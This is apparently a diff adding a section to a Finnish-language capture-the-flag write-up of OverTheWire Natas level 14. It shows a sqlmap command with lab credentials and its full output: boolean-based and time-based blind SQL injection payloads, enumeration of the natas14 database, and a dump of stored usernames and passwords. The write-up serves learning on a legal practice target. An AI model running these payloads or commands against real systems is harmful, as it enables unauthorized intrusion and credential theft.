@@ -504,6 +504,130 @@ Tässä ylemmässä tuloksena ainakin liittyen `access denied`:
 - Viesti koskien se ei tarkoita virhettä sqlmappissa - vaan soveluksessa eli natas omassa vastauksessa, joka yrittää estää näkyvyyttä. Koska sqlmpa sai injektiosta irti `boolean` ja `time-based blind` vastauksia, ja ohittanut sen näkyvyyttä. 
 
 
+**Seuraavaksi**:
+Tässä suoritin jotakin muuta, mutta meni kauan niin keskeytin, mutta ainakin yksi niistä sqlmap toiminnasta ainakin ja muutamia huomoittavia on:
+
+Tässä vaiheessa olet onnistuneesti:
+✅ Hyökännyt SQL-injektiolla username-kenttään
+✅ Löytänyt tietokannan nimen (natas14)
+✅ Listannut taulut
+✅ Löytänyt taulun users ja sen sarakkeet (username, password)
+✅ Dumpannut kaksi käyttäjää ja niiden salasanat (bob ja charlie)
+
+Muutamia huomioon mm.
+- username injektio    OR 101 -tyyline blind SQL injektio onnistui
+- MySQL versio löytyi >= 5.0.12 mahdollistaa mm. `SLEEP()`
+- users - taulu löytyi - joka on tietokannassa vain yksi taulu users
+- dumpatut tiedot - pari käyttäjätunnusta ja niiden salasanat
+- kesti kauan - tämä kesti tosiaan aika kauan joka on normi `time-based blind` - hyökkäys
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas14.natas.labs.overthewire.org/index.php" \
+  --auth-type Basic \
+  --auth-cred "natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" \
+  --data "username=natas15&password=test" \
+  --batch \
+  --level=5 --risk=3 --dump
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8.5#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:32:20 /2025-05-17/
+
+[12:32:21] [INFO] resuming back-end DBMS 'mysql' 
+[12:32:21] [INFO] testing connection to the target URL
+[12:32:21] [WARNING] potential permission problems detected ('Access denied')
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: username=admin" OR NOT 9188=9188#&password=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin" AND (SELECT 2142 FROM (SELECT(SLEEP(5)))vnvd)-- Cgqh&password=admin
+---
+[12:32:21] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL >= 5.0.12
+[12:32:21] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[12:32:21] [INFO] fetching current database
+[12:32:21] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[12:32:21] [INFO] retrieved: 
+[12:32:21] [WARNING] time-based comparison requires larger statistical model, please wait........................... (done)         
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[12:32:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[12:32:38] [INFO] adjusting time delay to 1 second due to good response times
+natas14
+[12:32:58] [INFO] fetching tables for database: 'natas14'
+[12:32:58] [INFO] fetching number of tables for database 'natas14'
+[12:32:58] [INFO] retrieved: 
+[12:32:58] [INFO] retrieved: 1
+[12:33:00] [INFO] retrieved: 
+[12:33:00] [INFO] retrieved: u
+[12:33:09] [ERROR] invalid character detected. retrying..
+[12:33:09] [WARNING] increasing time delay to 2 seconds
+sers
+[12:33:33] [INFO] fetching columns for table 'users' in database 'natas14'
+[12:33:33] [INFO] retrieved: 
+[12:33:33] [INFO] retrieved: 2
+[12:33:38] [INFO] retrieved: 
+[12:33:38] [INFO] retrieved: username
+[12:34:27] [INFO] retrieved: 
+[12:34:27] [INFO] retrieved: 
+[12:34:41] [ERROR] invalid character detected. retrying..
+[12:34:41] [WARNING] increasing time delay to 3 seconds
+[12:34:55] [ERROR] invalid character detected. retrying..
+[12:34:55] [WARNING] increasing time delay to 4 seconds
+password
+[12:36:47] [INFO] fetching entries for table 'users' in database 'natas14'
+[12:36:47] [INFO] fetching number of entries for table 'users' in database 'natas14'
+[12:36:47] [INFO] retrieved: 
+[12:36:47] [INFO] retrieved: 5
+[12:36:56] [INFO] retrieved: 
+[12:36:56] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+Dl2FB9O9op
+[12:39:31] [INFO] retrieved: 
+[12:39:31] [INFO] retrieved: bob
+[12:40:09] [INFO] retrieved: 
+[12:40:09] [INFO] retrieved: ikWGV9zc1i
+[12:42:41] [INFO] retrieved: 
+[12:42:41] [INFO] retrieved: ch
+[12:43:19] [ERROR] invalid character detected. retrying..
+[12:43:19] [WARNING] increasing time delay to 5 seconds
+arlie
+[12:44:22] [INFO] retrieved: 
+[12:44:22] [INFO] retrieved: 
+[12:44:42] [ERROR] invalid character detected. retrying..
+[12:44:42] [WARNING] increasing time delay to 6 seconds
+keep up the good^C
+[12:51:08] [WARNING] Ctrl+C detected in dumping phase                                                                               
+Database: natas14
+Table: users
+[2 entries]
++------------+----------+
+| password   | username |
++------------+----------+
+| Dl2FB9O9op | bob      |
+| ikWGV9zc1i | charlie  |
++------------+----------+
+
+[12:51:08] [INFO] table 'natas14.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/natas14.natas.labs.overthewire.org/dump/natas14/users.csv'                                                                                                              
+[12:51:08] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas14.natas.labs.overthewire.org'
+[12:51:08] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 12:51:08 /2025-05-17/
+```
+
 
 ---
 
